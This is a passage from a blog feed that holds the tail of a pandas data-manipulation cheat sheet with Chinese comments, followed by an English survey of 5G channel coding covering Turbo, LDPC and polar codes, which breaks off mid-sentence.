</span><br><span class="hljs-comment"># b. to_replace</span><br><span class="hljs-comment"># c. value</span><br><span class="hljs-comment"># 针对部分类</span><br>columns = [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>]<br>new_df = df.loc[:, columns]<br>new_df.replace(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,inplace=<span class="hljs-literal">True</span>)<br>df.loc[:, columns] = new_df<br><span class="hljs-comment"># pandas dtypes 并非严格规定 可以用其他数据类型填充</span><br><span class="hljs-comment"># 默认并不插入 df为引用 在函数内inplace可直接改变</span><br>df.replace(b, value=c,inplace=<span class="hljs-literal">True</span>)<br><span class="hljs-comment"># regex r&#x27;\1&#x27;</span><br>df.replace(&#123;a : b&#125;, &#123;a : c&#125;,regex=<span class="hljs-literal">True</span>)<br>df.replace(regex=&#123;b:c&#125;)<br>df.replace(a:b:c,regex=<span class="hljs-literal">True</span>)<br><span class="hljs-comment"># fillna -&gt; type np.nan regex并不会影响nan</span><br>df.fillna(value=,inplace=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h3 id="sort">sort</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1顺序 0逆序</span><br>df.sort_values(by=[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>], ascending=[<span class="hljs-number">1</span>, <span class="hljs-number">1</span>])<br>df.sort_index()<br><span class="hljs-comment"># rank</span><br>df.rank(ascending,pct)<br></code></pre></td></tr></table></figure><h2 id="datatype">datatype</h2><h3 id="muti-index">muti-index</h3><p>多索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># multi-index </span><br><span class="hljs-comment"># 根据等级 level 代表标题的层次</span><br><span class="hljs-comment"># show name</span><br>s.index.names<br><span class="hljs-comment"># series to df</span><br>s.unstack(level=<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># set-multi</span><br>multi = df.set_index([<span class="hljs-string">&#x27;Film&#x27;</span>, <span class="hljs-string">&#x27;Chapter&#x27;</span>, <span class="hljs-string">&#x27;Race&#x27;</span>, <span class="hljs-string">&#x27;Character&#x27;</span>])<br><br><span class="hljs-comment"># sort_index</span><br>multi = df.set_index([‘Film’, ‘Chapter’, ‘Race’, ‘Character’]).sort_index()<br><br><span class="hljs-comment"># remove</span><br>multi.reset_index()<br><br><span class="hljs-comment"># loc</span><br>multi.loc[(<span class="hljs-string">&#x27;The Fellowship Of The Ring&#x27;</span>, <span class="hljs-string">&#x27;01: Prologue&#x27;</span>), :]<br><span class="hljs-comment"># 跳过</span><br>multi.loc[(‘The Fellowship Of The Ring’,<span class="hljs-built_in">slice</span>(<span class="hljs-literal">None</span>),’Elf’), :].head(<span class="hljs-number">3</span>)<br><br><span class="hljs-comment"># cross-section get_datas</span><br>multi.xs(<span class="hljs-string">&#x27;Isildur&#x27;</span>, level=<span class="hljs-string">&#x27;Character&#x27;</span>).<span class="hljs-built_in">sum</span>()<br><br><span class="hljs-comment"># pivot_table</span><br><span class="hljs-comment"># word 为统计的目标</span><br><span class="hljs-comment"># 需要的分类: film，race，charactor </span><br><span class="hljs-comment"># 需要计算: film</span><br>pivoted = df.pivot_table(<br>    index = [<span class="hljs-string">&#x27;Race&#x27;</span>,<span class="hljs-string">&#x27;Character&#x27;</span>],<br>columns = <span class="hljs-string">&#x27;Film&#x27;</span>,<br>    <span class="hljs-comment"># 针对所有的分出类来的word（包含了其他标签 chaper...）</span><br>aggfunc = <span class="hljs-string">&#x27;sum&#x27;</span>,<br>    <span class="hljs-comment"># 设置一个针对所有列的量</span><br>margins = <span class="hljs-literal">True</span>, <span class="hljs-comment"># total column</span><br>margins_name = <span class="hljs-string">&#x27;All Films&#x27;</span>,<br><span class="hljs-comment"># 填充</span><br>    fill_value = <span class="hljs-number">0</span><br>).sort_index()<br><span class="hljs-comment"># 对列进行排序</span><br>order = [(<span class="hljs-string">&#x27;Words&#x27;</span>, <span class="hljs-string">&#x27;The Fellowship Of The Ring&#x27;</span>),<br>         (<span class="hljs-string">&#x27;Words&#x27;</span>, <span class="hljs-string">&#x27;The Two Towers&#x27;</span>),<br>         (<span class="hljs-string">&#x27;Words&#x27;</span>, <span class="hljs-string">&#x27;The Return Of The King&#x27;</span>), <br>         (<span class="hljs-string">&#x27;Words&#x27;</span>, <span class="hljs-string">&#x27;All Films&#x27;</span>)]<br>pivoted = pivoted.sort_values(by=(<span class="hljs-string">&#x27;Words&#x27;</span>, <span class="hljs-string">&#x27;All Films&#x27;</span>), ascending=<span class="hljs-literal">False</span>)<br>pivoted = pivoted.reindex(order, axis=<span class="hljs-number">1</span>)<br><span class="hljs-comment"># 需要的值：words</span><br><span class="hljs-comment"># 简易获取列</span><br>pivoted.loc[<span class="hljs-string">&#x27;Hobbit&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="category">category</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># create</span><br>pd.Series(<span class="hljs-built_in">list</span>(<span class="hljs-string">&#x27;abbccc&#x27;</span>)).astype(<span class="hljs-string">&#x27;category&#x27;</span>)<br><br><span class="hljs-comment"># get_category</span><br>s.cat.categories<br><br><span class="hljs-comment"># description -&gt; like string</span><br><span class="hljs-comment"># rename </span><br>s.cat.categories = [<span class="hljs-string">&quot;Group %s&quot;</span> % g <span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> s.cat.categories]<br>s = s.cat.rename_categories(&#123;<span class="hljs-number">1</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">2</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-number">3</span>: <span class="hljs-string">&quot;z&quot;</span>&#125;)<br><br><span class="hljs-comment"># ordered</span><br>s.sort_values(inplace=<span class="hljs-literal">True</span>)<br>s = s.cat.as_ordered()<br>s = s.cat.set_categories([<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], ordered=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><h3 id="encode">encode</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># convert type</span><br>new_date = series.astype(<span class="hljs-string">&#x27;datetime64[ns, US/Eastern]&#x27;</span>)<br><br><span class="hljs-comment"># hot encode</span><br>cabin_df = pd.get_dummies(<br>    df[[<span class="hljs-string">&#x27;Cabin&#x27;</span>]], columns=[<span class="hljs-string">&quot;Cabin&quot;</span>], prefix=[<span class="hljs-string">&quot;Cabin_Type&quot;</span>] <br>)<br>df=df.join(cabin_df)<br><br><span class="hljs-comment"># lable encode</span><br>df.loc[:,<span class="hljs-string">&quot;Pclass&quot;</span>] = df[<span class="hljs-string">&quot;Pclass&quot;</span>].astype(<span class="hljs-string">&#x27;category&#x27;</span>)<br>df[<span class="hljs-string">&#x27;Pclass_cat&#x27;</span>] = df[<span class="hljs-string">&quot;Pclass&quot;</span>].cat.codes<br></code></pre></td></tr></table></figure><h3 id="null">null</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">df.fillna(value=,inplace=<span class="hljs-literal">True</span>)<br><span class="hljs-comment"># 向上找非空</span><br>df.fillna(method=<span class="hljs-string">&#x27;ffill&#x27;</span>) <br><span class="hljs-comment"># notnull</span><br>df[<span class="hljs-string">&#x27;name&#x27;</span>].notnull()<br><span class="hljs-comment"># 判断</span><br>pd.isnull()<br></code></pre></td></tr></table></figure><p>插值</p><h3 id="datetime">datetime</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># str to datatime</span><br>pd.to_datetime(<span class="hljs-built_in">format</span>)<br>datetime.strptime(<span class="hljs-built_in">str</span>,<span class="hljs-string">&quot;%d%m%y,%H%M%S&quot;</span>) <br><span class="hljs-comment"># generate datatimes</span><br>dt.now()<br>dt.date(<span class="hljs-number">2005</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>)<br><span class="hljs-comment"># standard</span><br>start_date = date + <span class="hljs-string">&#x27; 09:00:00&#x27;</span><br>end_date = date + <span class="hljs-string">&#x27; 15:00:00&#x27;</span><br><span class="hljs-comment"># get weekday</span><br>df_index.index[<span class="hljs-number">0</span>].weekday()<br><span class="hljs-comment"># time to str</span><br>datetime.now().strftime(<span class="hljs-string">&quot;%H:%M:%S&quot;</span>)<br><span class="hljs-comment"># time delta</span><br>delta.days<br>pd.Timedelta(<span class="hljs-number">1</span>, unit=<span class="hljs-string">&quot;d&quot;</span>)<br>pd.Timedelta(pd.offsets.Day(<span class="hljs-number">2</span>))<br>pd.Timedelta(days=<span class="hljs-number">1</span>)<br><span class="hljs-comment"># datestamp 对于单一的日期而言 生产 timestamp</span><br>pd.to_datetime(<span class="hljs-string">&#x27;2020-08-01&#x27;</span>)<br><span class="hljs-comment"># 需加入转换成日期</span><br>start_date = pd.to_datetime(<span class="hljs-string">&#x27;2020-08-01&#x27;</span>).date()<br><span class="hljs-comment"># 运算</span><br>start_date - pd.Timedelta(days=<span class="hljs-number">10</span>)<br><br><span class="hljs-comment"># filter by year</span><br>final_df[<span class="hljs-string">&#x27;report_date&#x27;</span>] = pd.to_datetime(final_df[<span class="hljs-string">&#x27;report_date&#x27;</span>])<br>final_df[<span class="hljs-string">&#x27;year&#x27;</span>] = final_df.report_date.dt.year<br></code></pre></td></tr></table></figure><h3 id="str">str</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">df.<span class="hljs-built_in">str</span>.upper()<br></code></pre></td></tr></table></figure><h3 id="apply">apply</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">df.loc[:, <span class="hljs-string">&#x27;A&#x27;</span>] = df.loc[:, <span class="hljs-string">&#x27;A&#x27;</span>].apply(<br>    <span class="hljs-keyword">lambda</span> x: <span class="hljs-number">2</span> <span class="hljs-keyword">if</span> np.isnan(x) <span class="hljs-keyword">else</span> np.random.randint(<span class="hljs-number">2</span>,<span class="hljs-number">8</span>)<br>)<br></code></pre></td></tr></table></figure><h3 id="io">I/O</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>base_path = os.path.abspath(os.path.join(__file__, os.pardir))<br><br>df = pd.read_excel(<br>    <span class="hljs-string">&#x27;a.xlsx&#x27;</span>,<br>    <span class="hljs-comment"># index_col=None,</span><br>    <span class="hljs-comment"># col</span><br>    header = <span class="hljs-literal">None</span>,<br>    <span class="hljs-comment"># 数据类型</span><br>    converters=&#123;<br>        <span class="hljs-string">&#x27;names&#x27;</span>:<span class="hljs-built_in">str</span>,<br>    &#125;<br>)<br><br>pd.read_csv()<br><span class="hljs-comment"># set index as an independent column</span><br>df.to_csv(<br>    <span class="hljs-string">&#x27;a.csv&#x27;</span>,<br>    index=<span class="hljs-literal">None</span>,<br>    index_col=<span class="hljs-number">0</span>,<br>)<br><span class="hljs-comment"># csv encoding </span><br><br><span class="hljs-comment"># to_excel_sheet</span><br><span class="hljs-keyword">with</span> pd.ExcelWriter(<span class="hljs-string">&#x27;a.xlsx&#x27;</span>) <span class="hljs-keyword">as</span> writer:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a_list:<br>        df.to_excel(writer, sheet_name=i)<br><br><span class="hljs-comment"># read_sheet</span><br><br>xls = pd.ExcelFile(data_path)<br><span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> xls.sheet_names:<br>    df = pd.read_excel(xls,val)<br><br></code></pre></td></tr></table></figure><h2 id="notice">notice</h2><h3 id="axis">axis</h3><ol type="1"><li>根据访问的顺序 一维 axis = 0 二维 先列后行</li><li>calculate(axis) -&gt; 沿着axis进行运算/插入</li></ol><h3 id="viewreplace">view/replace</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># view 只代表copy</span><br>df[df.a &gt; <span class="hljs-number">5</span>][<span class="hljs-string">&#x27;b&#x27;</span>]<br><span class="hljs-comment"># 赋值</span><br>df.loc[df.a &gt; <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;b&#x27;</span>] = <span class="hljs-number">4</span><br><span class="hljs-comment"># 分成两段不改变原来的df</span><br><span class="hljs-comment"># join 不需要 inplace=true</span><br></code></pre></td></tr></table></figure><h3 id="storage">storage</h3><p>在函数中调用所做的改变影响全局 等号只改变引用在循环的调用中应使用df.copy()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># series to df</span><br>a.to_frame()<br>pd.series(,index=df.columns,name=df.index)<br>df.append(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment"># list/numpy/dict to series/dataframe</span><br>series = pd.series(<span class="hljs-built_in">list</span>)<br>df = pd.dataframe(<span class="hljs-built_in">dict</span>,columns=[])<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Machine Learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>A survey on 5G channel encoding technology</title>
    <link href="/2021/12/06/dsp/"/>
    <url>/2021/12/06/dsp/</url>
    
    <content type="html"><![CDATA[<h1 id="abstract">Abstract</h1><p>This article begins by explaining the meaning, motivation, anddevelopment of channel encoding. The concepts of two modern 5G codesystems, particularly polar codes, are then discussed, along with theirpros and downsides. Following that, the international standard andapplication scenarios for current codes are presented. China'sparticipation is also highlighted. Finally, it depicts the channelcoding technology's future trends.</p><h1 id="introduction">Introduction</h1><h2 id="basis">Basis</h2><p>One of the source encoder's functions, as mentioned in Sourceencoding, is to remove unnecessary binary digits from the digitizedsignal. The channel encoder's technique, on the other hand, is toprovide redundancy to the broadcast signal in order to repair errorscaused by noise during transmission at the receiver. Error-controlcoding is a method of encoding that protects against channel errors.Satellite communication, deep-space communication, mobile radiocommunication, and computer networking are all applications that requireerror-control codes.</p><p>There are two generally used ways of preventing errors inelectronically transferred data. Forward error control is one way (FEC).Information bits are secured against errors in this approach bytransmitting extra redundant bits, which can be used by the decoder todetect where errors occurred and how to rectify them if they occurduring transmission. The automatic repeat request method is the secondapproach to error control (ARQ). This method involves adding redundantbits to the transmitted data, which the recipient uses to detect errors.A request for a repeat broadcast is then sent by the recipient.</p><p>To control errors, we can employ repetition codes, the Hamming code,and convolutional encoding. Repetition codes simply work by sending eachdata bit three times. Because the information is blocked intofinite-length bit sequences to which a number of superfluous bits areadded, the Hamming code is called a block code. When a block encoderreceives k information bits, n k redundancy bits are appended to theinformation bits to create a transmitted code word of n bits. One blockof k information bits can so determine the entire code word of length n.As to convolutional encoding, the encoder output is an endless stream ofbits rather than being naturally split into chunks. Memory is used inconvolutional encoding such that the encoder output is determined by theprevious M blocks of k information bits combined with the current blockof k information bits.</p><h2 id="motivation">Motivation</h2><p>The digital signal will create error codes during transmission due tothe noise in the mobile communication system. To improve systemreliability, a variety of methods (use error correction/error detectioncoding technology, increase the signal transmission power, etc.) arerequired to improve signal and reduce the system error rate.</p><p>There are numerous benefits to using a higher-performing channelencoding method.</p><ol type="1"><li>Noise and interference rise when more data is delivered across anetwork. Better error correction helps the system to withstand thehigher errors caused, allowing for more capacity and, as a result, lowerper-user costs.</li><li>Channel coders and decoders with higher performance can handlehigher data rates, resulting in increased throughput.</li><li>Increasing the wireless link's efficiency lowers the power needs atboth the base station and the user's device, resulting in longer batterylife.</li></ol><h2 id="development-history">Development History</h2><p>The field of channel coding started with Claude Shannon’s 1948landmark paper. Its main goal for the next half-century was to developviable coding systems that approached the Shannon limit on a fewwell-understood channels, such as the additive white Gaussian noisechannel.</p><p>There was always a 2 to 3dB gap between the designed system gain andShannon theoretical limit before the Turbo code was discovered. Turbocode is also known as parallel concatenated convolutional code. TurboCodes and Tail Bitting Convolution Codes (TBCC) have proven to beefficient for LTE communication. Turbo code has been widely used inmobile communication technology. This technique is used for channelcoding from 3G to 4G and even 4.5G. Two convolutional encoders, twoserial decoders, and one interleaver are used in Turbo codes. Turbocodes receive their name from a revolutionary feedback loop they usethat, at least conceptually, works in the same way that turbo exhaustsystems do in cars. The actual novelty in turbo codes is in thecleverness with which soft data is used. Prior systems required hardknowledge of the received bits (e.g., 0s or 1s). Turbo codes, on theother hand, simply require a probabilistic assessment of each bit to becorrectly decoded. This effectively permits much more data to betransmitted through turbo code channels.</p><p>However, Turbo code has many iterations and a large decoding delay,which is difficult to meet the network requirements of 5G with highspeed and low delay. These codes failed to meet the requirements for 5Gcommunications. To meet the requirements of 5G communications, LDPC andPolar codes are used for error correction.</p><p>When Gallager first created LDPC codes in 1963, they were impracticalto apply and were forgotten until his work was rediscovered in 1996.Turbo codes, another class of capacity-approaching codes developed in1993, became the de facto coding scheme in the late 1990s, withapplications such as the Deep Space Network and satellitecommunications. Low-density parity-check codes, on the other hand, havesurpassed turbo codes in terms of error floor and performance in thehigher code rate range, leaving turbo codes suitable exclusively tolower code rates.</p><p>Polar codes were invented in 2009 by Erdal Arikan. They are the firstfamily of error-correcting codes that achieve the Shannon capacity. InOctober 2016, Huawei announced that in 5G field trials using polar codesfor channel coding, it achieved 27 G bit/s. The improvements have almostbridged the gap between channel performance and the Shannon limit, whichdefines the highest rate for a given bandwidth and noise level.</p><h1 id="key-technology">Key Technology</h1><h2 id="channel-capacity">Channel capacity</h2><p>Channel capacity indicates the theoretical maximum amount ofinformation that can be transmitted in a channel. <spanclass="math display">\[\begin{align*}&amp; R = I(X;Y) = H(X)- H(X|Y) \\&amp; C = \max_{p(a_i)}I(X;Y) \\\end{align*}\]</span> Shannon theorem indicates that the capacity of the channelwith noise is related to the bandwidth and signal-to-noise ratio of thetransmission channel under certain bandwidth. <spanclass="math display">\[C = 2B\log_2({1 + \frac{S}{N}})\]</span> Shannon also pointed out that if the information rate R is notgreater than the communication channel's capacity C, a coding approachmight be used to achieve the reliable transmission of information.However, the Shannon theorem does not specify how this system can beimplemented.</p><h2 id="ldpc-codes">LDPC codes</h2><p>LDPC (Low-density parity-check code) was first proposed by Gallagerin 1962. The initial theory of LDPC is based on binary domain, that is,binary LDPC. With further research on LDPC, LDPC is extended to amultivariate domain, namely multivariate LDPC. Binary LDPC has beenwidely used in the field of communication and broadcasting, and theresearch on multivariate LDPC has achieved remarkable results.</p><p>A sparse Tanner graph subclass of the bipartite graph is used tocreate an LDPC. A Tanner graph is a bipartite graph named after MichaelTanner that is used to express constraints or equations that specifyerror-correcting codes. Theoretical coding Tanner graphs are used tocombine smaller codes into longer ones. These graphs are usedextensively by both encoders and decoders.</p><p>LDPC codes are capacity-approaching codes, which means that practicalconstructions exist that allow the noise threshold to be set very closeto the theoretical maximum (the Shannon limit) for a symmetricmemoryless channel. The noise threshold defines an upper bound for thechannel noise, up to which the probability of lost information can bemade as small as desired.</p><p>Belief propagation, also known as sum-product message passing, is amessage-passing method used to infer from graphical models like Bayesiannetworks and Markov random fields. It determines the marginaldistribution for each unseen node (or variable) based on any observednodes (or variables). Belief propagation is widely employed inartificial intelligence and information theory, with empirical successin a variety of applications such as low-density parity-check codes,turbo codes, free energy approximation, and satisfiability.</p><p>Using iterative belief propagation techniques, LDPC codes can bedecoded in time linear to their block length.</p><h2 id="polar-codes">Polar codes</h2><p>Polar codes depend on channel polarization and are the first provablecode construction to achieve Shannon capacity for arbitrary symmetricbinary input channels. It has lower complexity and improved BER (BitError Ratio) performance. And it includes high-performance errorcorrection technology. And most importantly, polar codes do not exhibitthe error flow behavior, which means a higher SNR will definitely resultin a lower error rate.</p><p>Using a simple example from thelecture<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="https://www.youtube.com/watch?v=zYOXFt0Ixwk">[1]</span></a></sup>, we can quickly gain an intuitive understandingof the polar code.</p><p>BEC (Binary Erasure Channel) is a channel in which a transmittersends a bit (a zero or a one), and the receiver either gets the bitcorrectly or receives a message indicating that the bit was not received("erased") with a certain probability $ $. As shown in the picture.</p><p><img src="/images/binary%20erasure%20channel.png" alt="a binary erasure channel" style="zoom:50%;" /></p><p>The simplest case of polar code is considered first. The process ofChanel Polarization is shown in the diagram below when the code lengthis two.</p><figure><img src="/images/polar%20code%20.png" alt="polarization" /><figcaption aria-hidden="true">polarization</figcaption></figure><p>The decoding of U1 is as follows <span class="math display">\[\begin{equation}U_1 =    \begin{cases}      Y_1 \oplus Y_2, &amp; \text{if } Y_1, Y_2 \in \left\{ 0, 1\right\}\\      \text{?} \oplus Y_2, &amp; \text{if } Y_1 =\text{?}, Y_2 \in\left\{ 0, 1 \right\}\\      Y_1 \oplus \text{?}, &amp; \text{if } Y_1 \in \left\{ 0, 1\right\}, Y_2=\text{?}\\      \text{?} \oplus \text{?}, &amp; \text{if } Y_1=\text{?}, Y_2=\text{?}\\    \end{cases}\end{equation}\]</span> As shown in the equation, the receiver can get the U1information only when both Y1 and Y2 are sent successfully. If weconsider the transition of U1 as channel 1, the erasure probability is<span class="math display">\[P_1 = 1 - (1-\epsilon)^2 = 2\epsilon-\epsilon^2\]</span> Assuming that U1 transmission is successful, the sending of U2is <span class="math display">\[\begin{equation}U_2 =    \begin{cases}      Y_1 \oplus U_1, &amp; \text{if } Y_1\in \left\{ 0, 1 \right\}\\      Y_2, &amp; \text{if } Y_2 \in \left\{ 0, 1 \right\}\\      \text{?}, &amp; \text{if } Y_1 = Y_2=\text{?}\\    \end{cases}\end{equation}\]</span> As shown in the equation, the receiver can't get the U1information only when both Y1 and Y2 are sent unsuccessfully. If weconsider the transition of U2 as channel 2, the erasure probability is<span class="math display">\[P_2 = \epsilon^2 \\\]</span> After the above transformation, called polarization, weget<br /><span class="math display">\[P2 = \epsilon^2\le \epsilon \le 2\epsilon-\epsilon^2 = P_1, \epsilon \in[0, 1]\]</span> If we make U1 be the frozen bit, and U2 be the info bit, theerasure probability of U2 can be decreased.</p><p>Then we consider a new channel that has 4 bits and the erasureprobabilities are <span class="math display">\[\begin{align*}&amp; P_{1}&#39; = 1 - (1 - P_1)^2 = 1 - (1-\epsilon)^4 \\&amp; P_{2}&#39; = 1 - (1 - P_2)^2 = 1 - (1 - \epsilon^2)^2 \\&amp; P_{3}&#39; = {P_1}^2 = (\epsilon^2 + 2\epsilon)^2 \\&amp; P_{4}&#39; = {P_2}^2 = \epsilon^4 \\\end{align*}\]</span> As shown in the equation, the fourth bit gets a lower erasureprobability.</p><p>It can be proved that polar codes are capable of achieving channelcapacity as code length approaches positive infinity.</p><h2 id="compare">Compare</h2><p>Based on the analysis, Compared with the Turbo code system, the LDPCsystem has many advantages.</p><ol type="1"><li>low system complexity, low time delay and easier hardwareimplementation</li><li>better frame error ratio performance</li><li>error-floor is greatly reduced to meet the demand of extremely lowerror rate for communication system</li><li>the decoder has smaller power, adopts parallel decoding, and has ahigher data throughput.</li></ol><p>But LDPC codes are not a complete alternative to turbo code, It isconcluded that the turbo code has better performance in moderate coderate (Rate 1/2) while the LDPC is recommended for higher code rates(3/4,7/8) because it has better performance beside less complexitycompared with turbo code. For turbo code, all code rates require thesame decoding complexity since all code rates are obtained from themother code via puncturing. In contrast, the LDPC decoding complexitydecreases as the code rate increases.</p><p>Compared with the LDPC, Turbo code system, the polar codes hasseveral advantages.</p><ol type="1"><li>A higher SNR will definitely result in a lower error rate in a polarcode system.</li><li>Its coding and decoding complexity is low. When the coding length isN, the complexity is only O(NlogN).</li></ol><p>Compared with polar codes, the LDPC system also has someadvantages.</p><ol type="1"><li>LDPC has developed for many years and the infrastructure isrelatively well developed while Polar code is still a newtechnology.</li><li>systems using multivariate LDPC have better band utilization, andthey also perform better in middle and shorter code length than Polarcode.</li></ol><h1 id="application">Application</h1><h2 id="international-standard">International Standard</h2><p>IEEE 802.16, a wireless metropolitan network standard, uses blockturbo coding and convolutional turbo coding.</p><p>Three application scenarios have been identified by the 5G standard:eMBB (improved mobile broadband), mMTC (large connected Internet ofthings), and URLLC (ultra-reliable ultra-low latency communication).eMBB stands for high-traffic mobile broadband, such as 3Dultra-high-definition video, mMTC stands for large-scale Internet ofthings business, and URLLC stands for services needing low-delay andhigh-reliability connections, such as manless driving and industrialautomation. The LDPC code was established as a long block coding methodfor mobile broadband eMBB scenario business data channel coding at the3GPPTSGRANWG1 conference in October 2016. The control channel codingmethod for the 5G short block of the eMBB scenario was determined toemploy Polar code in November 2016 at the 3GPPRAN1 meeting.</p><p>The WiFi standard 802.11ac has embraced LDPC as a channel codingstandard. In 2003, an irregular repeat accumulates (IRA) type LDPC codedefeated six turbo codes to become the error-correcting code in the newDVB-S2 digital television satellite transmission standard. The ITU-TG.hn standard chose LDPC over convolutional turbo codes as the forwarderror correction (FEC) system in 2008. G.hn chose LDPC codes over turbocodes due to their lower decoding complexity (particularly at data ratesnear 1.0 Gbit/s) and the fact that the proposed turbo codes had a largeerror floor over the specified range of operation. 10GBASE-T Ethernet,which transfers data at 10 gigabits per second over twisted-pair lines,also uses LDPC codes. As of 2009, LDPC codes are also part of the Wi-Fi802.11 standard as an optional part of 802.11n and 802.11ac, in the HighThroughput (HT) PHY specification.</p><h2 id="application-scenarios">Application Scenarios</h2><p>Turbo codes are used in many ways.</p><ol type="1"><li>extensively in 3G and 4G mobile telephony standards; e.g., in HSPA,EV-DO, and LTE.</li><li>MediaFLO, terrestrial mobile television system from Qualcomm.</li><li>The interaction channel of satellite communication systems, such asDVB-RCS and DVB-RCS2.</li><li>Recent NASA missions such as Mars Reconnaissance Orbiter use turbocodes as an alternative to Reed–Solomon error correction -Viterbidecoder codes.</li></ol><p>LDPC codes also have lots of applications.</p><ol type="1"><li>In 5G NR (New Radio) LDPC codes are used for the data channel.</li><li>satellite transmission</li><li>Ethernet and WiFi</li><li>Even at low bit error rates, some OFDM systems incorporate an extraoutside error correction that addresses the infrequent errors that slippast the LDPC 